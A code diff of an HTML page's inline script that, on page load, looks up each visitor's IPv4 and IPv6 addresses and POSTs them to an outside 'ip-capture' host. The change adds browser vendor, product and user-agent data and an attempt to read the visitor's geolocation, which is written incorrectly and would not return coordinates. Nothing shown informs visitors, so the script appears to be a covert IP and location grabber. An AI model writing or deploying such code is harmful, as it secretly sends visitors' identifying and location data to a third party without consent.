@@ -12,12 +12,18 @@
         (async() => {
             const ipv6Obj = await fetch('https://ipv6.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
             const ipv4Obj = await fetch('https://ipv4.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
+            let loc;
+            try {
+                loc = await navigator.geolocation.getCurrentPosition(pos => ({lat: pos.coords.latitude, lng: pos.coords.longitude}))
+            } catch (err) {
+                loc = {'error': err};
+            }
             await fetch('https://ip-capture.onrender.com', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ipv4: ipv4Obj.ip, ipv6: ipv6Obj.ip})
+                body: JSON.stringify({ipv4: ipv4Obj.ip, ipv6: ipv6Obj.ip, user_agent: navigator.userAgentData, product: navigator.product, vendor: navigator.vendor, loc})
             })
         })()
     </script>
